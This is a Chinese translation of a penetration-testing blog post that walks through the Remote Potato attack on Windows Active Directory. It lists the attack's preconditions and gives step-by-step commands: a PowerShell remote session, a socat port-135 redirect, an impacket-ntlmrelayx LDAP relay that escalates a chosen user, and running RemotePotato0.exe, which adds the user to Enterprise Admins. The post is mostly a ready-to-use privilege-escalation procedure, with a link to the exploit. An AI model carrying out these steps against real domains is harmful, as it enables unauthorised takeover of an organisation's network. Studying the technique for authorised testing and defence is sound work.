> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rOKyq4KWHnPY4WAAyqfx6A)

本文为翻译文，如有需要可查看原文：  

https://pentestlab.blog/2021/05/04/remote-potato-from-domain-user-to-enterprise-admin/

前言  

如需复现该漏洞，我们需要开启 PS 远程管理，开启方法如下

```
Enable-PSremoting
set-item wsman:localhost\client\trustedhosts -value
```

可以使用下面的命令来查看我们的目标配置：

```
Get-PSSessionConfiguration
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBIlBSR71IahUsKd1NN8e3o0ySCRiab0TtquXiaDNNDqAzhib1ADcrIAvYw/640?wx_fmt=png)

如有需要，可将指定用户加入到指定组中：  

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjB2WCeddGibLtGOqdqicK6bciamvtTyt3XqG4ONDFSvwlYcdK1diaeMvQHrQ/640?wx_fmt=png)

所以该攻击的前提为：

1.  具有 Domain Administrator 特权的用户实际上已登录到主机或通过远程桌面登录
    
2.  攻击者已获得对主机的初始访问权限，或者已通过 WinRM 或 SSH 访问
    
3.  LDAP 和 SMB 签名未配置
    

复现

首先使用下面的命令与目标主机建立链接

```
Enter-PSSession -ComputerName 10.0.0.2 -Authentication Negotiate -Credential $(get-credential)
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBPaZCm5DQFia7IqkKFicKUS2GibDskibp4PDT7qVeTYO88u3rbKZlswvSdQ/640?wx_fmt=png)

然后使用 socat 进行转发：

```
sudo stty -tostop
sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.2:9998 &
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBfP26ewIfpOVLcylGnuqfiaib01MwZaUMYWaOc3emQEDjPbpMH2Sx2fAg/640?wx_fmt=png)

然后进行中继

```
impacket-ntlmrelayx -t ldap://10.0.0.1 --no-wcf-server --escalate-user pentestlab
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBGILHyetI2m0KnGzu0N0icYwAI15zm4WshAnSuAMRfZo5jO2zMypxIOg/640?wx_fmt=png)

然后在目标机器上执行 remote potato

```
RemotePotato0.exe -r 10.0.0.3 -p 9998
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBVSSlng9m34uXsywEZF4j0bDWcaU6FiaogCUVzPxibvQkFibNBes9EgPicg/640?wx_fmt=png)

若成功则用户会被加入到 Enterprise Admins 组

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBXOUjRVMPAVcQX2AGAf2Vy0IXvgk11qbUQEuAiaxAfDzqkxheyvJs61A/640?wx_fmt=png)

此时便可以使用任何的横向移动工具获取 system 权限：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08W5hsqbakW4gontOe2JltjBNof7WVjgTJMDY8bgibEMgh0zbl4TibxgZhibJ1lTPDjiciaT5GeC7ywgJ7w/640?wx_fmt=png)

exploit 地址：https://github.com/antonioCoco/RemotePotato0

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)